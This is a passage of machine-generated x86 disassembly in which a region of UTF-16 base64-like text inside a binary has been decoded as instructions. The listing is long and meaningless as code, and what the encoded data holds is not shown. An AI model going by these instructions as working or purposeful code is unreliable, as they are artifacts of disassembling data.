  4030d2:	00 57 00             	add    %dl,0x0(%edi)
  4030d5:	68 00 35 00 4e       	push   $0x4e003500
  4030da:	00 54 00 71          	add    %dl,0x71(%eax,%eax,1)
  4030de:	00 4a 00             	add    %cl,0x0(%edx)
  4030e1:	62 00                	bound  %eax,(%eax)
  4030e3:	78 00                	js     0x4030e5
  4030e5:	76 00                	jbe    0x4030e7
  4030e7:	34 00                	xor    $0x0,%al
  4030e9:	65 00 47 00          	add    %al,%gs:0x0(%edi)
  4030ed:	6c                   	insb   (%dx),%es:(%edi)
  4030ee:	00 69 00             	add    %ch,0x0(%ecx)
  4030f1:	7a 00                	jp     0x4030f3
  4030f3:	56                   	push   %esi
  4030f4:	00 41 00             	add    %al,0x0(%ecx)
  4030f7:	66 00 74 00 41       	data16 add %dh,0x41(%eax,%eax,1)
  4030fc:	00 30                	add    %dh,(%eax)
  4030fe:	00 61 00             	add    %ah,0x0(%ecx)
  403101:	78 00                	js     0x403103
  403103:	58                   	pop    %eax
  403104:	00 42 00             	add    %al,0x0(%edx)
  403107:	4d                   	dec    %ebp
  403108:	00 62 00             	add    %ah,0x0(%edx)
  40310b:	46                   	inc    %esi
  40310c:	00 4e 00             	add    %cl,0x0(%esi)
  40310f:	4d                   	dec    %ebp
  403110:	00 44 00 54          	add    %al,0x54(%eax,%eax,1)
  403114:	00 42 00             	add    %al,0x0(%edx)
  403117:	47                   	inc    %edi
  403118:	00 66 00             	add    %ah,0x0(%esi)
  40311b:	58                   	pop    %eax
  40311c:	00 6b 00             	add    %ch,0x0(%ebx)
  40311f:	47                   	inc    %edi
  403120:	00 38                	add    %bh,(%eax)
  403122:	00 4d 00             	add    %cl,0x0(%ebp)
  403125:	74 00                	je     0x403127
  403127:	67 00 6c 00          	add    %ch,0x0(%si)
  40312b:	56                   	push   %esi
  40312c:	00 5a 00             	add    %bl,0x0(%edx)
  40312f:	44                   	inc    %esp
  403130:	00 68 00             	add    %ch,0x0(%eax)
  403133:	36 00 6e 00          	add    %ch,%ss:0x0(%esi)
  403137:	43                   	inc    %ebx
  403138:	00 6d 00             	add    %ch,0x0(%ebp)
  40313b:	42                   	inc    %edx
  40313c:	00 49 00             	add    %cl,0x0(%ecx)
  40313f:	66 00 67 00          	data16 add %ah,0x0(%edi)
  403143:	6f                   	outsl  %ds:(%esi),(%dx)
  403144:	00 78 00             	add    %bh,0x0(%eax)
  403147:	70 00                	jo     0x403149
  403149:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  40314d:	4f                   	dec    %edi
  40314e:	00 2f                	add    %ch,(%edi)
  403150:	00 79 00             	add    %bh,0x0(%ecx)
  403153:	54                   	push   %esp
  403154:	00 31                	add    %dh,(%ecx)
  403156:	00 37                	add    %dh,(%edi)
  403158:	00 6a 00             	add    %ch,0x0(%edx)
  40315b:	33 00                	xor    (%eax),%eax
  40315d:	69 00 50 00 50 00    	imul   $0x500050,(%eax),%eax
  403163:	39 00                	cmp    %eax,(%eax)
  403165:	4d                   	dec    %ebp
  403166:	00 62 00             	add    %ah,0x0(%edx)
  403169:	44                   	inc    %esp
  40316a:	00 78 00             	add    %bh,0x0(%eax)
  40316d:	44                   	inc    %esp
  40316e:	00 46 00             	add    %al,0x0(%esi)
  403171:	4f                   	dec    %edi
  403172:	00 31                	add    %dh,(%ecx)
  403174:	00 35 00 42 00 71    	add    %dh,0x71004200
  40317a:	00 2f                	add    %ch,(%edi)
  40317c:	00 5a 00             	add    %bl,0x0(%edx)
  40317f:	79 00                	jns    0x403181
  403181:	62 00                	bound  %eax,(%eax)
  403183:	5a                   	pop    %edx
  403184:	00 30                	add    %dh,(%eax)
  403186:	00 4b 00             	add    %cl,0x0(%ebx)
  403189:	68 00 5a 00 65       	push   $0x65005a00
  40318e:	00 45 00             	add    %al,0x0(%ebp)
  403191:	30 00                	xor    %al,(%eax)
  403193:	4d                   	dec    %ebp
  403194:	00 55 00             	add    %dl,0x0(%ebp)
  403197:	55                   	push   %ebp
  403198:	00 78 00             	add    %bh,0x0(%eax)
  40319b:	59                   	pop    %ecx
  40319c:	00 57 00             	add    %dl,0x0(%edi)
  40319f:	54                   	push   %esp
  4031a0:	00 31                	add    %dh,(%ecx)
  4031a2:	00 5a 00             	add    %bl,0x0(%edx)
  4031a5:	74 00                	je     0x4031a7
  4031a7:	48                   	dec    %eax
  4031a8:	00 71 00             	add    %dh,0x0(%ecx)
  4031ab:	77 00                	ja     0x4031ad
  4031ad:	35 00 7a 00 6a       	xor    $0x6a007a00,%eax
  4031b2:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
  4031b6:	00 69 00             	add    %ch,0x0(%ecx)
  4031b9:	52                   	push   %edx
  4031ba:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  4031be:	00 62 00             	add    %ah,0x0(%edx)
  4031c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4031c2:	00 59 00             	add    %bl,0x0(%ecx)
  4031c5:	4b                   	dec    %ebx
  4031c6:	00 32                	add    %dh,(%edx)
  4031c8:	00 41 00             	add    %al,0x0(%ecx)
  4031cb:	53                   	push   %ebx
  4031cc:	00 46 00             	add    %al,0x0(%esi)
  4031cf:	6b 00 62             	imul   $0x62,(%eax),%eax
  4031d2:	00 48 00             	add    %cl,0x0(%eax)
  4031d5:	6a 00                	push   $0x0
  4031d7:	30 00                	xor    %al,(%eax)
  4031d9:	41                   	inc    %ecx
  4031da:	00 32                	add    %dh,(%edx)
  4031dc:	00 4a 00             	add    %cl,0x0(%edx)
  4031df:	45                   	inc    %ebp
  4031e0:	00 4f 00             	add    %cl,0x0(%edi)
  4031e3:	39 00                	cmp    %eax,(%eax)
  4031e5:	5a                   	pop    %edx
  4031e6:	00 64 00 42          	add    %ah,0x42(%eax,%eax,1)
  4031ea:	00 41 00             	add    %al,0x0(%ecx)
  4031ed:	43                   	inc    %ebx
  4031ee:	00 36                	add    %dh,(%esi)
  4031f0:	00 41 00             	add    %al,0x0(%ecx)
  4031f3:	4b                   	dec    %ebx
  4031f4:	00 36                	add    %dh,(%esi)
  4031f6:	00 57 00             	add    %dl,0x0(%edi)
  4031f9:	39 00                	cmp    %eax,(%eax)
  4031fb:	79 00                	jns    0x4031fd
  4031fd:	71 00                	jno    0x4031ff
  4031ff:	35 00 6c 00 55       	xor    $0x55006c00,%eax
  403204:	00 45 00             	add    %al,0x0(%ebp)
  403207:	39 00                	cmp    %eax,(%eax)
  403209:	70 00                	jo     0x40320b
  40320b:	51                   	push   %ecx
  40320c:	00 68 00             	add    %ch,0x0(%eax)
  40320f:	78 00                	js     0x403211
  403211:	69 00 6b 00 4e 00    	imul   $0x4e006b,(%eax),%eax
  403217:	4e                   	dec    %esi
  403218:	00 53 00             	add    %dl,0x0(%ebx)
  40321b:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40321f:	4f                   	dec    %edi
  403220:	00 58 00             	add    %bl,0x0(%eax)
  403223:	35 00 6c 00 34       	xor    $0x34006c00,%eax
  403228:	00 76 00             	add    %dh,0x0(%esi)
  40322b:	75 00                	jne    0x40322d
  40322d:	69 00 36 00 67 00    	imul   $0x670036,(%eax),%eax
  403233:	42                   	inc    %edx
  403234:	00 4e 00             	add    %cl,0x0(%esi)
  403237:	67 00 38             	add    %bh,(%bx,%si)
  40323a:	00 78 00             	add    %bh,0x0(%eax)
  40323d:	39 00                	cmp    %eax,(%eax)
  40323f:	33 00                	xor    (%eax),%eax
  403241:	69 00 42 00 33 00    	imul   $0x330042,(%eax),%eax
  403247:	4d                   	dec    %ebp
  403248:	00 61 00             	add    %ah,0x0(%ecx)
  40324b:	6a 00                	push   $0x0
  40324d:	45                   	inc    %ebp
  40324e:	00 4c 00 73          	add    %cl,0x73(%eax,%eax,1)
  403252:	00 31                	add    %dh,(%ecx)
  403254:	00 69 00             	add    %ch,0x0(%ecx)
  403257:	73 00                	jae    0x403259
  403259:	34 00                	xor    $0x0,%al
  40325b:	47                   	inc    %edi
  40325c:	00 57 00             	add    %dl,0x0(%edi)
  40325f:	62 00                	bound  %eax,(%eax)
  403261:	36 00 31             	add    %dh,%ss:(%ecx)
  403264:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  403268:	00 44 00 33          	add    %al,0x33(%eax,%eax,1)
  40326c:	00 48 00             	add    %cl,0x0(%eax)
  40326f:	57                   	push   %edi
  403270:	00 63 00             	add    %ah,0x0(%ebx)
  403273:	31 00                	xor    %eax,(%eax)
  403275:	4f                   	dec    %edi
  403276:	00 47 00             	add    %al,0x0(%edi)
  403279:	43                   	inc    %ebx
  40327a:	00 2f                	add    %ch,(%edi)
  40327c:	00 51 00             	add    %dl,0x0(%ecx)
  40327f:	35 00 42 00 43       	xor    $0x43004200,%eax
  403284:	00 67 00             	add    %ah,0x0(%edi)
  403287:	48                   	dec    %eax
  403288:	00 58 00             	add    %bl,0x0(%eax)
  40328b:	33 00                	xor    (%eax),%eax
  40328d:	77 00                	ja     0x40328f
  40328f:	35 00 73 00 31       	xor    $0x31007300,%eax
  403294:	00 31                	add    %dh,(%ecx)
  403296:	00 66 00             	add    %ah,0x0(%esi)
  403299:	59                   	pop    %ecx
  40329a:	00 59 00             	add    %bl,0x0(%ecx)
  40329d:	61                   	popa
  40329e:	00 47 00             	add    %al,0x0(%edi)
  4032a1:	63 00                	arpl   %eax,(%eax)
  4032a3:	75 00                	jne    0x4032a5
  4032a5:	6a 00                	push   $0x0
  4032a7:	31 00                	xor    %eax,(%eax)
  4032a9:	44                   	inc    %esp
  4032aa:	00 66 00             	add    %ah,0x0(%esi)
  4032ad:	76 00                	jbe    0x4032af
  4032af:	58                   	pop    %eax
  4032b0:	00 62 00             	add    %ah,0x0(%edx)
  4032b3:	36 00 54 00 53       	add    %dl,%ss:0x53(%eax,%eax,1)
  4032b8:	00 4f 00             	add    %cl,0x0(%edi)
  4032bb:	56                   	push   %esi
  4032bc:	00 34 00             	add    %dh,(%eax,%eax,1)
  4032bf:	69 00 57 00 58 00    	imul   $0x580057,(%eax),%eax
  4032c5:	48                   	dec    %eax
  4032c6:	00 7a 00             	add    %bh,0x0(%edx)
  4032c9:	31 00                	xor    %eax,(%eax)
  4032cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4032cc:	00 41 00             	add    %al,0x0(%ecx)
  4032cf:	2f                   	das
  4032d0:	00 41 00             	add    %al,0x0(%ecx)
  4032d3:	4b                   	dec    %ebx
  4032d4:	00 73 00             	add    %dh,0x0(%ebx)
  4032d7:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  4032db:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  4032de:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
  4032e2:	00 41 00             	add    %al,0x0(%ecx)
  4032e5:	6b 00 31             	imul   $0x31,(%eax),%eax
  4032e8:	00 4e 00             	add    %cl,0x0(%esi)
  4032eb:	4b                   	dec    %ebx
  4032ec:	00 7a 00             	add    %bh,0x0(%edx)
  4032ef:	66 00 53 00          	data16 add %dl,0x0(%ebx)
  4032f3:	51                   	push   %ecx
  4032f4:	00 63 00             	add    %ah,0x0(%ebx)
  4032f7:	5a                   	pop    %edx
  4032f8:	00 4d 00             	add    %cl,0x0(%ebp)
  4032fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4032fc:	00 53 00             	add    %dl,0x0(%ebx)
  4032ff:	4b                   	dec    %ebx
  403300:	00 4a 00             	add    %cl,0x0(%edx)
  403303:	30 00                	xor    %al,(%eax)
  403305:	34 00                	xor    $0x0,%al
  403307:	74 00                	je     0x403309
  403309:	79 00                	jns    0x40330b
  40330b:	6f                   	outsl  %ds:(%esi),(%dx)
  40330c:	00 63 00             	add    %ah,0x0(%ebx)
  40330f:	54                   	push   %esp
  403310:	00 64 00 4a          	add    %ah,0x4a(%eax,%eax,1)
  403314:	00 6c 00 72          	add    %ch,0x72(%eax,%eax,1)
  403318:	00 6d 00             	add    %ch,0x0(%ebp)
  40331b:	47                   	inc    %edi
  40331c:	00 54 00 65          	add    %dl,0x65(%eax,%eax,1)
  403320:	00 2b                	add    %ch,(%ebx)
  403322:	00 6f 00             	add    %ch,0x0(%edi)
  403325:	4c                   	dec    %esp
  403326:	00 68 00             	add    %ch,0x0(%eax)
  403329:	4a                   	dec    %edx
  40332a:	00 70 00             	add    %dh,0x0(%eax)
  40332d:	4f                   	dec    %edi
  40332e:	00 34 00             	add    %dh,(%eax,%eax,1)
  403331:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  403335:	47                   	inc    %edi
  403336:	00 74 00 45          	add    %dh,0x45(%eax,%eax,1)
  40333a:	00 4a 00             	add    %cl,0x0(%edx)
  40333d:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  403341:	48                   	dec    %eax
  403342:	00 36                	add    %dh,(%esi)
  403344:	00 58 00             	add    %bl,0x0(%eax)
  403347:	5a                   	pop    %edx
  403348:	00 5a 00             	add    %bl,0x0(%edx)
  40334b:	47                   	inc    %edi
  40334c:	00 41 00             	add    %al,0x0(%ecx)
  40334f:	4b                   	dec    %ebx
  403350:	00 36                	add    %dh,(%esi)
  403352:	00 75 00             	add    %dh,0x0(%ebp)
  403355:	70 00                	jo     0x403357
  403357:	58                   	pop    %eax
  403358:	00 74 00 53          	add    %dh,0x53(%eax,%eax,1)
  40335c:	00 4a 00             	add    %cl,0x0(%edx)
  40335f:	4c                   	dec    %esp
  403360:	00 49 00             	add    %cl,0x0(%ecx)
  403363:	47                   	inc    %edi
  403364:	00 30                	add    %dh,(%eax)
  403366:	00 52 00             	add    %dl,0x0(%edx)
  403369:	78 00                	js     0x40336b
  40336b:	33 00                	xor    (%eax),%eax
  40336d:	37                   	aaa
  40336e:	00 7a 00             	add    %bh,0x0(%edx)
  403371:	54                   	push   %esp
  403372:	00 56 00             	add    %dl,0x0(%esi)
  403375:	45                   	inc    %ebp
  403376:	00 52 00             	add    %dl,0x0(%edx)
  403379:	6e                   	outsb  %ds:(%esi),(%dx)
  40337a:	00 70 00             	add    %dh,0x0(%eax)
  40337d:	4b                   	dec    %ebx
  40337e:	00 58 00             	add    %bl,0x0(%eax)
  403381:	2b 00                	sub    (%eax),%eax
  403383:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  403387:	57                   	push   %edi
  403388:	00 5a 00             	add    %bl,0x0(%edx)
  40338b:	65 00 32             	add    %dh,%gs:(%edx)
  40338e:	00 42 00             	add    %al,0x0(%edx)
  403391:	71 00                	jno    0x403393
  403393:	49                   	dec    %ecx
  403394:	00 74 00 55          	add    %dh,0x55(%eax,%eax,1)
  403398:	00 75 00             	add    %dh,0x0(%ebp)
  40339b:	58                   	pop    %eax
  40339c:	00 4b 00             	add    %cl,0x0(%ebx)
  40339f:	74 00                	je     0x4033a1
  4033a1:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
  4033a5:	31 00                	xor    %eax,(%eax)
  4033a7:	43                   	inc    %ebx
  4033a8:	00 65 00             	add    %ah,0x0(%ebp)
  4033ab:	2b 00                	sub    (%eax),%eax
  4033ad:	5a                   	pop    %edx
  4033ae:	00 39                	add    %bh,(%ecx)
  4033b0:	00 45 00             	add    %al,0x0(%ebp)
  4033b3:	45                   	inc    %ebp
  4033b4:	00 42 00             	add    %al,0x0(%edx)
  4033b7:	6d                   	insl   (%dx),%es:(%edi)
  4033b8:	00 43 00             	add    %al,0x0(%ebx)
  4033bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4033bc:	00 65 00             	add    %ah,0x0(%ebp)
  4033bf:	62 00                	bound  %eax,(%eax)
  4033c1:	6d                   	insl   (%dx),%es:(%edi)
  4033c2:	00 63 00             	add    %ah,0x0(%ebx)
  4033c5:	53                   	push   %ebx
  4033c6:	00 41 00             	add    %al,0x0(%ecx)
  4033c9:	71 00                	jno    0x4033cb
  4033cb:	47                   	inc    %edi
  4033cc:	00 6a 00             	add    %ch,0x0(%edx)
  4033cf:	53                   	push   %ebx
  4033d0:	00 7a 00             	add    %bh,0x0(%edx)
  4033d3:	5a                   	pop    %edx
  4033d4:	00 4a 00             	add    %cl,0x0(%edx)
  4033d7:	62 00                	bound  %eax,(%eax)
  4033d9:	49                   	dec    %ecx
  4033da:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  4033de:	00 53 00             	add    %dl,0x0(%ebx)
  4033e1:	4b                   	dec    %ebx
  4033e2:	00 68 00             	add    %ch,0x0(%eax)
  4033e5:	68 00 2b 00 6b       	push   $0x6b002b00
  4033ea:	00 31                	add    %dh,(%ecx)
  4033ec:	00 39                	add    %bh,(%ecx)
  4033ee:	00 61 00             	add    %ah,0x0(%ecx)
  4033f1:	55                   	push   %ebp
  4033f2:	00 33                	add    %dh,(%ebx)
  4033f4:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
  4033f8:	00 4f 00             	add    %cl,0x0(%edi)
  4033fb:	4a                   	dec    %edx
  4033fc:	00 6b 00             	add    %ch,0x0(%ebx)
  4033ff:	63 00                	arpl   %eax,(%eax)
  403401:	71 00                	jno    0x403403
  403403:	45                   	inc    %ebp
  403404:	00 42 00             	add    %al,0x0(%edx)
  403407:	71 00                	jno    0x403409
  403409:	62 00                	bound  %eax,(%eax)
  40340b:	47                   	inc    %edi
  40340c:	00 53 00             	add    %dl,0x0(%ebx)
  40340f:	4c                   	dec    %esp
  403410:	00 62 00             	add    %ah,0x0(%edx)
  403413:	79 00                	jns    0x403415
  403415:	2f                   	das
  403416:	00 62 00             	add    %ah,0x0(%edx)
  403419:	65 00 44 00 4f       	add    %al,%gs:0x4f(%eax,%eax,1)
  40341e:	00 46 00             	add    %al,0x0(%esi)
  403421:	67 00 54 00          	add    %dl,0x0(%si)
  403425:	53                   	push   %ebx
  403426:	00 45 00             	add    %al,0x0(%ebp)
  403429:	4b                   	dec    %ebx
  40342a:	00 63 00             	add    %ah,0x0(%ebx)
  40342d:	78 00                	js     0x40342f
  40342f:	4e                   	dec    %esi
  403430:	00 53 00             	add    %dl,0x0(%ebx)
  403433:	39 00                	cmp    %eax,(%eax)
  403435:	77 00                	ja     0x403437
  403437:	56                   	push   %esi
  403438:	00 75 00             	add    %dh,0x0(%ebp)
  40343b:	38 00                	cmp    %al,(%eax)
  40343d:	49                   	dec    %ecx
  40343e:	00 5a 00             	add    %bl,0x0(%edx)
  403441:	6e                   	outsb  %ds:(%esi),(%dx)
  403442:	00 68 00             	add    %ch,0x0(%eax)
  403445:	48                   	dec    %eax
  403446:	00 66 00             	add    %ah,0x0(%esi)
  403449:	6c                   	insb   (%dx),%es:(%edi)
  40344a:	00 4f 00             	add    %cl,0x0(%edi)
  40344d:	68 00 70 00 54       	push   $0x54007000
  403452:	00 73 00             	add    %dh,0x0(%ebx)
  403455:	54                   	push   %esp
  403456:	00 5a 00             	add    %bl,0x0(%edx)
  403459:	78 00                	js     0x40345b
  40345b:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
  40345f:	72 00                	jb     0x403461
  403461:	30 00                	xor    %al,(%eax)
  403463:	64 00 30             	add    %dh,%fs:(%eax)
  403466:	00 45 00             	add    %al,0x0(%ebp)
  403469:	61                   	popa
  40346a:	00 6e 00             	add    %ch,0x0(%esi)
  40346d:	32 00                	xor    (%eax),%al
  40346f:	2b 00                	sub    (%eax),%eax
  403471:	2b 00                	sub    (%eax),%eax
  403473:	6c                   	insb   (%dx),%es:(%edi)
  403474:	00 4e 00             	add    %cl,0x0(%esi)
  403477:	73 00                	jae    0x403479
  403479:	39 00                	cmp    %eax,(%eax)
  40347b:	58                   	pop    %eax
  40347c:	00 66 00             	add    %ah,0x0(%esi)
  40347f:	67 00 38             	add    %bh,(%bx,%si)
  403482:	00 50 00             	add    %dl,0x0(%eax)
  403485:	71 00                	jno    0x403487
  403487:	6c                   	insb   (%dx),%es:(%edi)
  403488:	00 53 00             	add    %dl,0x0(%ebx)
  40348b:	30 00                	xor    %al,(%eax)
  40348d:	33 00                	xor    (%eax),%eax
  40348f:	33 00                	xor    (%eax),%eax
  403491:	30 00                	xor    %al,(%eax)
  403493:	6b 00 47             	imul   $0x47,(%eax),%eax
  403496:	00 79 00             	add    %bh,0x0(%ecx)
  403499:	7a 00                	jp     0x40349b
  40349b:	48                   	dec    %eax
  40349c:	00 33                	add    %dh,(%ebx)
  40349e:	00 79 00             	add    %bh,0x0(%ecx)
  4034a1:	72 00                	jb     0x4034a3
  4034a3:	41                   	inc    %ecx
  4034a4:	00 46 00             	add    %al,0x0(%esi)
  4034a7:	72 00                	jb     0x4034a9
  4034a9:	50                   	push   %eax
  4034aa:	00 48 00             	add    %cl,0x0(%eax)
  4034ad:	35 00 7a 00 62       	xor    $0x62007a00,%eax
  4034b2:	00 46 00             	add    %al,0x0(%esi)
  4034b5:	4e                   	dec    %esi
  4034b6:	00 6f 00             	add    %ch,0x0(%edi)
  4034b9:	61                   	popa
  4034ba:	00 53 00             	add    %dl,0x0(%ebx)
  4034bd:	56                   	push   %esi
  4034be:	00 49 00             	add    %cl,0x0(%ecx)
  4034c1:	73 00                	jae    0x4034c3
  4034c3:	58                   	pop    %eax
  4034c4:	00 73 00             	add    %dh,0x0(%ebx)
  4034c7:	6c                   	insb   (%dx),%es:(%edi)
  4034c8:	00 2f                	add    %ch,(%edi)
  4034ca:	00 61 00             	add    %ah,0x0(%ecx)
  4034cd:	4c                   	dec    %esp
  4034ce:	00 58 00             	add    %bl,0x0(%eax)
  4034d1:	57                   	push   %edi
  4034d2:	00 34 00             	add    %dh,(%eax,%eax,1)
  4034d5:	66 00 62 00          	data16 add %ah,0x0(%edx)
  4034d9:	71 00                	jno    0x4034db
  4034db:	41                   	inc    %ecx
  4034dc:	00 67 00             	add    %ah,0x0(%edi)
  4034df:	47                   	inc    %edi
  4034e0:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  4034e4:	00 63 00             	add    %ah,0x0(%ebx)
  4034e7:	37                   	aaa
  4034e8:	00 75 00             	add    %dh,0x0(%ebp)
  4034eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4034ec:	00 75 00             	add    %dh,0x0(%ebp)
  4034ef:	2b 00                	sub    (%eax),%eax
  4034f1:	73 00                	jae    0x4034f3
  4034f3:	47                   	inc    %edi
  4034f4:	00 51 00             	add    %dl,0x0(%ecx)
  4034f7:	63 00                	arpl   %eax,(%eax)
  4034f9:	32 00                	xor    (%eax),%al
  4034fb:	41                   	inc    %ecx
  4034fc:	00 43 00             	add    %al,0x0(%ebx)
  4034ff:	59                   	pop    %ecx
  403500:	00 33                	add    %dh,(%ebx)
  403502:	00 31                	add    %dh,(%ecx)
  403504:	00 4c 00 42          	add    %cl,0x42(%eax,%eax,1)
  403508:	00 79 00             	add    %bh,0x0(%ecx)
  40350b:	54                   	push   %esp
  40350c:	00 72 00             	add    %dh,0x0(%edx)
  40350f:	39 00                	cmp    %eax,(%eax)
  403511:	6a 00                	push   $0x0
  403513:	48                   	dec    %eax
  403514:	00 56 00             	add    %dl,0x0(%esi)
  403517:	77 00                	ja     0x403519
  403519:	57                   	push   %edi
  40351a:	00 70 00             	add    %dh,0x0(%eax)
  40351d:	43                   	inc    %ebx
  40351e:	00 45 00             	add    %al,0x0(%ebp)
  403521:	6f                   	outsl  %ds:(%esi),(%dx)
  403522:	00 53 00             	add    %dl,0x0(%ebx)
  403525:	4a                   	dec    %edx
  403526:	00 77 00             	add    %dh,0x0(%edi)
  403529:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
  40352d:	68 00 74 00 50       	push   $0x50007400
  403532:	00 67 00             	add    %ah,0x0(%edi)
  403535:	70 00                	jo     0x403537
  403537:	57                   	push   %edi
  403538:	00 45 00             	add    %al,0x0(%ebp)
  40353b:	34 00                	xor    $0x0,%al
  40353d:	61                   	popa
  40353e:	00 67 00             	add    %ah,0x0(%edi)
  403541:	6c                   	insb   (%dx),%es:(%edi)
  403542:	00 46 00             	add    %al,0x0(%esi)
  403545:	56                   	push   %esi
  403546:	00 46 00             	add    %al,0x0(%esi)
  403549:	70 00                	jo     0x40354b
  40354b:	5a                   	pop    %edx
  40354c:	00 61 00             	add    %ah,0x0(%ecx)
  40354f:	50                   	push   %eax
  403550:	00 61 00             	add    %ah,0x0(%ecx)
  403553:	73 00                	jae    0x403555
  403555:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  403559:	51                   	push   %ecx
  40355a:	00 66 00             	add    %ah,0x0(%esi)
  40355d:	56                   	push   %esi
  40355e:	00 56 00             	add    %dl,0x0(%esi)
  403561:	67 00 55 00          	add    %dl,0x0(%di)
  403565:	41                   	inc    %ecx
  403566:	00 55 00             	add    %dl,0x0(%ebp)
  403569:	52                   	push   %edx
  40356a:	00 4d 00             	add    %cl,0x0(%ebp)
  40356d:	6e                   	outsb  %ds:(%esi),(%dx)
  40356e:	00 51 00             	add    %dl,0x0(%ecx)
  403571:	52                   	push   %edx
  403572:	00 5a 00             	add    %bl,0x0(%edx)
  403575:	33 00                	xor    (%eax),%eax
  403577:	57                   	push   %edi
  403578:	00 6d 00             	add    %ch,0x0(%ebp)
  40357b:	62 00                	bound  %eax,(%eax)
  40357d:	56                   	push   %esi
  40357e:	00 4d 00             	add    %cl,0x0(%ebp)
  403581:	72 00                	jb     0x403583
  403583:	61                   	popa
  403584:	00 45 00             	add    %al,0x0(%ebp)
  403587:	35 00 42 00 57       	xor    $0x57004200,%eax
  40358c:	00 30                	add    %dh,(%eax)
  40358e:	00 52 00             	add    %dl,0x0(%edx)
  403591:	6c                   	insb   (%dx),%es:(%edi)
  403592:	00 45 00             	add    %al,0x0(%ebp)
  403595:	6f                   	outsl  %ds:(%esi),(%dx)
  403596:	00 2b                	add    %ch,(%ebx)
  403598:	00 49 00             	add    %cl,0x0(%ecx)
  40359b:	6c                   	insb   (%dx),%es:(%edi)
  40359c:	00 61 00             	add    %ah,0x0(%ecx)
  40359f:	71 00                	jno    0x4035a1
  4035a1:	6a 00                	push   $0x0
  4035a3:	4e                   	dec    %esi
  4035a4:	00 42 00             	add    %al,0x0(%edx)
  4035a7:	49                   	dec    %ecx
  4035a8:	00 48 00             	add    %cl,0x0(%eax)
  4035ab:	76 00                	jbe    0x4035ad
  4035ad:	49                   	dec    %ecx
  4035ae:	00 68 00             	add    %ch,0x0(%eax)
  4035b1:	44                   	inc    %esp
  4035b2:	00 68 00             	add    %ch,0x0(%eax)
  4035b5:	69 00 57 00 4d 00    	imul   $0x4d0057,(%eax),%eax
  4035bb:	7a 00                	jp     0x4035bd
  4035bd:	45                   	inc    %ebp
  4035be:	00 2b                	add    %ch,(%ebx)
  4035c0:	00 53 00             	add    %dl,0x0(%ebx)
  4035c3:	61                   	popa
  4035c4:	00 74 00 51          	add    %dh,0x51(%eax,%eax,1)
  4035c8:	00 59 00             	add    %bl,0x0(%ecx)
  4035cb:	30 00                	xor    %al,(%eax)
  4035cd:	66 00 4b 00          	data16 add %cl,0x0(%ebx)
  4035d1:	31 00                	xor    %eax,(%eax)
  4035d3:	35 00 44 00 65       	xor    $0x65004400,%eax
  4035d8:	00 66 00             	add    %ah,0x0(%esi)
  4035db:	54                   	push   %esp
  4035dc:	00 48 00             	add    %cl,0x0(%eax)
  4035df:	5a                   	pop    %edx
  4035e0:	00 70 00             	add    %dh,0x0(%eax)
  4035e3:	35 00 42 00 2f       	xor    $0x2f004200,%eax
  4035e8:	00 75 00             	add    %dh,0x0(%ebp)
  4035eb:	48                   	dec    %eax
  4035ec:	00 69 00             	add    %ch,0x0(%ecx)
  4035ef:	53                   	push   %ebx
  4035f0:	00 7a 00             	add    %bh,0x0(%edx)
  4035f3:	57                   	push   %edi
  4035f4:	00 2f                	add    %ch,(%edi)
  4035f6:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
  4035fa:	00 41 00             	add    %al,0x0(%ecx)
  4035fd:	32 00                	xor    (%eax),%al
  4035ff:	57                   	push   %edi
  403600:	00 30                	add    %dh,(%eax)
  403602:	00 33                	add    %dh,(%ebx)
  403604:	00 58 00             	add    %bl,0x0(%eax)
  403607:	38 00                	cmp    %al,(%eax)
  403609:	32 00                	xor    (%eax),%al
  40360b:	5a                   	pop    %edx
  40360c:	00 33                	add    %dh,(%ebx)
  40360e:	00 66 00             	add    %ah,0x0(%esi)
  403611:	45                   	inc    %ebp
  403612:	00 77 00             	add    %dh,0x0(%edi)
  403615:	6d                   	insl   (%dx),%es:(%edi)
  403616:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  40361a:	00 67 00             	add    %ah,0x0(%edi)
  40361d:	33 00                	xor    (%eax),%eax
  40361f:	32 00                	xor    (%eax),%al
  403621:	6b 00 6a             	imul   $0x6a,(%eax),%eax
  403624:	00 53 00             	add    %dl,0x0(%ebx)
  403627:	78 00                	js     0x403629
  403629:	50                   	push   %eax
  40362a:	00 78 00             	add    %bh,0x0(%eax)
  40362d:	72 00                	jb     0x40362f
  40362f:	37                   	aaa
  403630:	00 63 00             	add    %ah,0x0(%ebx)
  403633:	74 00                	je     0x403635
  403635:	55                   	push   %ebp
  403636:	00 50 00             	add    %dl,0x0(%eax)
  403639:	37                   	aaa
  40363a:	00 2f                	add    %ch,(%edi)
  40363c:	00 62 00             	add    %ah,0x0(%edx)
  40363f:	50                   	push   %eax
  403640:	00 4f 00             	add    %cl,0x0(%edi)
  403643:	72 00                	jb     0x403645
  403645:	30 00                	xor    %al,(%eax)
  403647:	32 00                	xor    (%eax),%al
  403649:	39 00                	cmp    %eax,(%eax)
  40364b:	4b                   	dec    %ebx
  40364c:	00 51 00             	add    %dl,0x0(%ecx)
  40364f:	72 00                	jb     0x403651
  403651:	2f                   	das
  403652:	00 4b 00             	add    %cl,0x0(%ebx)
  403655:	53                   	push   %ebx
  403656:	00 30                	add    %dh,(%eax)
